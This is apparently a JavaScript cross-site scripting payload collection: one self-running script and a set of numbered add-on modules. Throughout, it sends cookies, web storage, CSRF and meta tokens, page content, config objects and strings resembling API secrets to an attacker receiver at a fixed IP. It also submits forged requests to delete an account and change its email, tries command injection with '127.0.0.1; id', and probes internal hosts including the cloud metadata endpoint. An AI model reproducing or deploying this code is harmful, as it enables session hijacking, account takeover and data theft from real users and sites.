// payloads___
//
//

(function () {
  const TARGET = "http://192.168.1.221:8080"; // ← Your receiver
  const ORIGIN = location.origin;

  function postData(encoded, path = "") {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", `${TARGET}${path}`, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("data=" + encodeURIComponent(encoded));
    } catch (e) {}
  }

  function sendRaw(data, path = "") {
    postData(btoa(data), path);
  }

  // 1. DOM Preview
  sendRaw(document.documentElement.outerHTML.slice(0, 2048), "/dom");

  // 2. Cookie + Env
  sendRaw(document.cookie + " | " + navigator.userAgent, "/meta");

  // 3. Light CSRF (GET request with no response)
  try {
    const img = new Image();
    img.src = `${ORIGIN}/account/delete?id=1234`;
  } catch (_) {}

  // 4. CSRF via POST (auto-submit form technique)
  try {
    const f = document.createElement("form");
    f.method = "POST";
    f.action = `${ORIGIN}/account/change-email`;
    const i = document.createElement("input");
    i.name = "email";
    i.value = "admin@attacker.test";
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  } catch (_) {}

  // 5. Attempt light command injection via POST
  try {
    const payload = { host: "127.0.0.1; id" }; // benign command for testing
    const r = new XMLHttpRequest();
    r.open("POST", `${ORIGIN}/api/ping`, true);
    r.setRequestHeader("Content-Type", "application/json");
    r.onload = function () {
      sendRaw("cmd result: " + this.responseText, "/cmd");
    };
    r.onerror = function () {
      sendRaw("cmd request failed", "/cmd-error");
    };
    r.send(JSON.stringify(payload));
  } catch (_) {}

  // 6. SSRF to known local endpoint
  try {
    fetch(`${ORIGIN}/api/internal/config`)
      .then(r => r.text())
      .then(t => sendRaw("internal config: " + t.slice(0, 512), "/config"))
      .catch(() => {});
  } catch (_) {}

  // 7. Timing attack / delay profiling
  try {
    const t1 = performance.now();
    fetch(`${ORIGIN}/healthz?debug=1`).then(() => {
      const delta = performance.now() - t1;
      sendRaw("delta=" + delta.toFixed(2), "/timing");
    });
  } catch (_) {}

  // 8. Iframe force-load (possible CSRF)
  try {
    const i = document.createElement("iframe");
    i.style.display = "none";
    i.src = `${ORIGIN}/admin/refresh`;
    document.body.appendChild(i);
  } catch (_) {}

  // 9. Service list ping
  const internalHosts = [
    "http://localhost:8000/status",
    "http://127.0.0.1:5000/debug",
    "http://169.254.169.254/latest/meta-data/hostname", // AWS metadata
  ];

  internalHosts.forEach(url => {
    try {
      fetch(url)
        .then(r => r.text())
        .then(t => sendRaw("fetched " + url + ": " + t.slice(0, 128), "/ssrf"));
    } catch (_) {}
  });

  // 10. Beacon on error
  window.addEventListener("error", function (e) {
    sendRaw("client error: " + e.message, "/error");
  });

  // 11. Async blind POST trigger (for devops endpoints)
  try {
    fetch(`${ORIGIN}/api/refresh`, {
      method: "POST",
      headers: { "X-Trigger": "soft" },
    });
  } catch (_) {}

  // 12. Screenshot DOM section over time
  setTimeout(() => {
    try {
      const section = document.querySelector("main")?.outerHTML || "";
      sendRaw("delayed view: " + section.slice(0, 1024), "/deferred");
    } catch (_) {}
  }, 3000);

})();
//
////
////

### 🔧 Additional Payload Modules

#### 13. 🧪 `localStorage` / `sessionStorage` Exfil

```javascript
try {
  const allStorage = Object.entries(localStorage).map(([k,v]) => `${k}=${v}`).join('; ') +
                     " | " +
                     Object.entries(sessionStorage).map(([k,v]) => `${k}=${v}`).join('; ');
  sendRaw("storage: " + allStorage, "/storage");
} catch (_) {}
```

#### 14. 🧭 Link Crawler

```javascript
try {
  const links = [...document.links].map(l => l.href).join('\n');
  sendRaw("links: " + links.slice(0, 1024), "/links");
} catch (_) {}
```

#### 15. 🧠 Script Tag Collection

```javascript
try {
  const scripts = [...document.scripts].map(s => s.src || '[inline]').join('\n');
  sendRaw("scripts: " + scripts.slice(0, 1024), "/scripts");
} catch (_) {}
```

#### 16. 🔑 Look for Common Tokens/Secrets

```javascript
try {
  const body = document.body.innerText;
  const matches = body.match(/(api[_-]?key|token|secret)[^\s"']{0,40}/gi);
  if (matches && matches.length) {
    sendRaw("potential secrets: " + matches.join(', '), "/secrets");
  }
} catch (_) {}
```

#### 17. 🖼️ Screenshot Candidate: `<canvas>` Extraction

```javascript
try {
  const canvas = document.querySelector("canvas");
  if (canvas) {
    const data = canvas.toDataURL("image/png");
    sendRaw("canvas snapshot: " + data.slice(0, 256), "/canvas");
  }
} catch (_) {}
```

#### 18. 📡 DNS Leak via `<a>` element

```javascript
try {
  const a = document.createElement("a");
  a.href = "http://leak.YOURDOMAIN.test";
  document.body.appendChild(a);
} catch (_) {}
```

#### 19. 🧬 CSP Bypass Attempt (XHR to inline)

```javascript
try {
  const src = document.querySelector("script:not([src])")?.textContent || "";
  sendRaw("inline script: " + src.slice(0, 512), "/inlinejs");
} catch (_) {}
```

#### 20. 🛑 CSP Header Detection

```javascript
try {
  fetch("/", { method: "HEAD" }).then(r => {
    const csp = r.headers.get("Content-Security-Policy");
    if (csp) sendRaw("CSP header: " + csp, "/csp");
  });
} catch (_) {}
```

#### 21. 🧾 Exfil iframes’ `src` values

```javascript
try {
  const iframes = [...document.querySelectorAll("iframe")].map(i => i.src).join(', ');
  sendRaw("iframes: " + iframes, "/iframes");
} catch (_) {}
```

#### 22. 🧩 DOM Token Dump (meta + csrf)

```javascript
try {
  const metas = [...document.querySelectorAll("meta")].map(m => `${m.name || m.property || m.httpEquiv}=${m.content}`).join('; ');
  sendRaw("meta tokens: " + metas, "/meta-tokens");
} catch (_) {}
```

#### 23. 📦 Exfil Config JS Objects from Page

```javascript
try {
  for (let k in window) {
    if (/config|settings|options/i.test(k) && typeof window[k] === "object") {
      const payload = JSON.stringify(window[k]);
      if (payload.length > 20 && payload.length < 2048) {
        sendRaw("window." + k + ": " + payload.slice(0, 1024), "/config-obj");
        break;
      }
    }
  }
} catch (_) {}
```

